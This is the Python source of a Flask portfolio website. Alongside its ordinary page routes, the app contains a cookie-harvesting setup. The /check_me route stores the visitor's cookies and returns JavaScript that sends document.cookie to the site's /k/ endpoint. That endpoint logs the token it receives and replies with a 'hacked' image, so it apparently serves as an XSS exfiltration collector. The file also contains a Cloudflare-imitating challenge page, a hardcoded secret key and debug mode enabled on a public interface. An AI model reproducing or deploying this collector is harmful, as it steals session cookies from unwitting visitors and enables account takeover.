from flask import *
from flask_bootstrap import Bootstrap
import pymysql.cursors
import random
import re

# TODO: create DB Portfolio
def getConnection():
    # You can change the connection arguments.
    connection = pymysql.connect(host='localhost',
                                 user='DEPRECATED',
                                 password='DEPRECATED',
                                 db='portfolio',
                                 charset='utf8mb4',
                                 cursorclass=pymysql.cursors.DictCursor)
    return connection

connection = getConnection()
cursor = connection.cursor()

"""def ExecSql(cmd, Args_tuple=None):
    connection = getConnection()
    cursor = connection.cursor()
    cursor.execute(cmd, Args_tuple)
    connection.commit()
"""
def create_app():
    app = Flask(__name__)
    Bootstrap(app)
    return app

app = create_app()
app.config['DEBUG'] = True
app.config['CUSTOM_STATIC_PATH'] = 'templates'
app.config['PROPAGATE_EXCEPTIONS'] = 'TESTING'

twitter_url = "https://twitter.com/l0x539"
linkedin_url = "https://www.linkedin.com/in/sikouknourdin/"
facebook_url = "#https://www.facebook.com/"
feed_url = "https://0x539.co"
os_image = "/static/NiCO/NiCO.jpg"
og_site_name = "0x539.co A website for Nourdin portfolio"
twitter_descr = """This is my portfolio, I'd like you to check my portfolio and I wish I get contacted by you, my name is Nourdin and I'm a Web Dev and an InfoSec guy."""
twitter_title = "Nourdin - Web Dev / Back-end Dev / Front-end Dev / Software Dev / Security Software Dev"
twitter_site = "@l0x539"
twitter_creator = "@l0x539"
og_title = "Nourdin - Web Dev / Back-end Dev / Front-end Dev / Software Dev / Security Software Dev"
logo_alt = "Nourdin - Web Dev / Back-end Dev / Front-end Dev / Software Dev / Security Software Dev"

d = []

@app.route('/robots.txt')
@app.route('/sitemap.xml')
def static_from_root():
    return send_from_directory(app.static_folder, request.path[1:])

@app.route('/')
def Route():
    title = "Nourdin - Web Dev / Back-end Dev / Front-end Dev / Software Dev / Security Software Dev"
    meta_description = """This is my portfolio, I'd like you to check my portfolio and I wish I get contacted by you, my name is Nourdin and I'm a Web Dev and an InfoSec guy."""
    og_descreption = meta_description
    body_class = "home page page-id-11 page-template page-template-template-home page-template-template-home-php"
    current_active_page = '/'
    return render_template("Main.html", current_page_template="page_home.html", current_active_page=current_active_page, title=title, meta_description=meta_description, og_descreption=og_descreption, body_class=body_class, twitter_url=twitter_url, linkedin_url=linkedin_url, facebook_url=facebook_url, feed_url=feed_url, os_image=os_image, og_site_name=og_site_name, twitter_descr=twitter_descr, twitter_title=twitter_title, twitter_site=twitter_site, twitter_creator=twitter_creator, og_title=og_title, logo_alt=logo_alt)

@app.route('/contact', methods = ['GET','POST'])
def Contact():
    if request.method == 'POST':
        if ((request.form.getlist('name')) and (request.form.getlist('email')) and (request.form.getlist('subject')) and (request.form.getlist('msg'))):
            name = str(request.form.getlist('name')[0].encode('utf-8').decode()).strip()
            email = str(request.form.getlist('email')[0].encode('utf-8').decode()).strip()
            subject = str(request.form.getlist('subject')[0].encode('utf-8').decode()).strip()
            msg = str(request.form.getlist('msg')[0].encode('utf-8').decode()).strip()
            if (len(msg) <= 2000):
                if (len(msg) != 0) and (len(subject) < 30) and (len(subject) != 0) and (len(subject) < 100) and (
                    len(name) > 0) and (len(email) > 0) and (len(email) < 100) and (len(name) < 100) and (
                re.match(r"^[A-Za-z0-9\.\+_-]+@[A-Za-z0-9\._-]+\.[a-zA-Z]*$", email)):
                    try:
                        connection = getConnection()
                        cursor = connection.cursor()
                        cursor.execute("INSERT INTO contacts (name, email, subject, message) VALUES (%s, %s, %s, %s) ", (name, email, subject, msg))
                        connection.commit()
                        return jsonify(result={"status": 200})
                    except:
                        return jsonify(result={"status": 500})
                else:
                    flash(
                        'var Success = false;')
                    return jsonify(result={"status": 500})
            else:
                flash(
                        'var Success = false;')
                return jsonify(result={"status": 500})


                    # TODO: add contacts to db.
        else:
            flash('$(document).ready(function(){alertify.log("🤖 Something went wrong couldnt subscribe. ");});')
            return jsonify(result={"status": 500})
    # alertify.log("thank you for contacting me. !0x539");
    meta_description = "Contact !0x530 (Nourdin)"
    title = "Contact | Nourdin"
    og_descreption = meta_description
    current_active_page = 'contact'
    body_class = "page page-id-20 page-template page-template-template-contact page-template-template-contact-php contact"
    return render_template("Main.html", current_page_template="page_contact.html", current_active_page=current_active_page, title=title, meta_description=meta_description, og_descreption=og_descreption, body_class=body_class, twitter_url=twitter_url, linkedin_url=linkedin_url, facebook_url=facebook_url, feed_url=feed_url, os_image=os_image, og_site_name=og_site_name, twitter_descr=twitter_descr, twitter_title=twitter_title, twitter_site=twitter_site, twitter_creator=twitter_creator, og_title=og_title, logo_alt=logo_alt)

@app.route('/about')
def About():
    current_active_page = 'about'
    meta_description = "About !0x530 (Nourdin)"
    title = "About | Nourdin"
    og_descreption = meta_description
    body_class = "page page-id-13 page-template page-template-template-about page-template-template-about-php about"
    return render_template("Main.html", current_page_template="page_about.html", current_active_page=current_active_page, title=title, meta_description=meta_description, og_descreption=og_descreption, body_class=body_class, twitter_url=twitter_url, linkedin_url=linkedin_url, facebook_url=facebook_url, feed_url=feed_url, os_image=os_image, og_site_name=og_site_name, twitter_descr=twitter_descr, twitter_title=twitter_title, twitter_site=twitter_site, twitter_creator=twitter_creator, og_title=og_title, logo_alt=logo_alt)


@app.route('/portfolio')
def Portfolio():
    current_active_page = 'portfolio'
    meta_description = "Portfolio !0x530 (Nourdin)"
    title = "Portfolio | Nourdin"
    og_descreption = meta_description
    body_class = "page page-id-18 page-template page-template-template-gallery page-template-template-gallery-php portfolio"
    # add protfolio projects here
    connection = getConnection()
    cursor = connection.cursor()
    cursor.execute("SELECT * FROM project_greed")
    connection.commit()
    project_greed = []
    Cursor = cursor
    connection.commit()
    for cur in Cursor:
        FIX = [cur["title"], cur["main_data_pic"]]
        FIX_1 = []
        for image, title_url in [A.split(",") if ((A.count(",") == 1) and (len(A) != 0)) else ["", ""] for A in
                                 cur["Ahrefs"].split("\n")]:
            if (image != "") and (title_url != ""):
                FIX_1.append([image, title_url])
        FIX.append(FIX_1)
        project_greed.append(FIX)
    return render_template("Main.html", current_page_template="page_portfolio.html", project_greed=project_greed, current_active_page=current_active_page, title=title, meta_description=meta_description, og_descreption=og_descreption, body_class=body_class, twitter_url=twitter_url, linkedin_url=linkedin_url, facebook_url=facebook_url, feed_url=feed_url, os_image=os_image, og_site_name=og_site_name, twitter_descr=twitter_descr, twitter_title=twitter_title, twitter_site=twitter_site, twitter_creator=twitter_creator, og_title=og_title, logo_alt=logo_alt)

@app.route('/skills')
def Skills():
    current_active_page = 'skills'
    meta_description = "Skills !0x530 (Nourdin)"
    title = "Skills | Nourdin"
    og_descreption = meta_description
    body_class = "page page-id-15 page-template page-template-template-skills page-template-template-skills-php skills"
    return render_template("Main.html", current_page_template="page_skills.html", current_active_page=current_active_page, title=title, meta_description=meta_description, og_descreption=og_descreption, body_class=body_class, twitter_url=twitter_url, linkedin_url=linkedin_url, facebook_url=facebook_url, feed_url=feed_url, os_image=os_image, og_site_name=og_site_name, twitter_descr=twitter_descr, twitter_title=twitter_title, twitter_site=twitter_site, twitter_creator=twitter_creator, og_title=og_title, logo_alt=logo_alt)

@app.route('/LearnHacking')
def LH():
    return "Comming Soon on LearnHacking.us!"

@app.errorhandler(404)
def page_not_found(e):
    current_active_page = 'error 404'
    meta_description = "Error, this webpage doesn't exist, if you think something is wrong please contact Nourdin, or use https://0x539.us ."
    title = "404 - Something Went Wrong"
    og_descreption = meta_description
    body_class = "error404"
    return render_template("Main.html", current_page_template="404.html", current_active_page=current_active_page, title=title, meta_description=meta_description, og_descreption=og_descreption, body_class=body_class, twitter_url=twitter_url, linkedin_url=linkedin_url, facebook_url=facebook_url, feed_url=feed_url, os_image=os_image, og_site_name=og_site_name, twitter_descr=twitter_descr, twitter_title=twitter_title, twitter_site=twitter_site, twitter_creator=twitter_creator, og_title=og_title, logo_alt=logo_alt), 404

@app.route('/k/<token>')
def hack(token):
    if token and len(token.strip()) < 1000:
        connection = getConnection()
        cursor = connection.cursor()
        cursor.execute("SELECT * FROM tokens")
        connection.commit()
        for c in cursor:
            if c['token'] == token.strip():
                return send_from_directory(app.static_folder, "hacked.svg")
        connectio = getConnection()
        curso = connectio.cursor()
        curso.execute("INSERT INTO tokens (token, date) values (%s, NOW())", (token.strip()))
        connectio.commit()
        return send_from_directory(app.static_folder, "hacked.svg")
    return abort(404)


@app.route('/check_me')
def hello():
    name = str(request.cookies)
    connection = getConnection()
    cursor = connection.cursor()
    cursor.execute("INSERT INTO cookies (cookie) VALUES (%s)", (name,))
    connection.commit()
    return '''
<script>
function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}
httpGet("https://0x539.co/k/cookie="+document.cookie)
</script>
'''

@app.route("/cloudflare/hytale_hub/custom_page/version_1.0/::IM_UNDER_ATTACK_BOX::/1c4a38c15b8b29d5ff990de395e83d35")
def cloudflare():
    conn = getConnection()
    curs = conn.cursor()
    curs.execute("SELECT statment FROM cloudstatments")
    conn.commit()
    statments = []
    Cursor = curs
    for cur in Cursor:
        statments.append(cur['statment'])
    connection = getConnection()
    cursor = connection.cursor()
    cursor.execute("SELECT * FROM cloudscolors")
    connection.commit()
    for cur in cursor:
        text_color = cur['text_color']
        color_1 = cur['color_1']
        color_2 = cur['color_2']
        color_3 = cur['color_3']
        hex_color_1 = cur['hex_color_1']
        hex_color_2 = cur['hex_color_2']
        hex_color_3 = cur['hex_color_3']
        break

    statment = random.choice(statments) if len(statments) != 0 else "[statments goes here]"
    return render_template("cloudflare_layout.html", statment=statment, text_color=text_color, color_1=color_1, color_2=color_2, color_3=color_3, hex_color_1=hex_color_1, hex_color_2=hex_color_2, hex_color_3=hex_color_3)

@app.route('/tasty', methods = ['GET'])
def testy():
    return send_from_directory(app.static_folder, "test.html")
if __name__ == "__main__":
    app.secret_key = 'Nico984156327'
    app.run(host='0.0.0.0', debug=True)
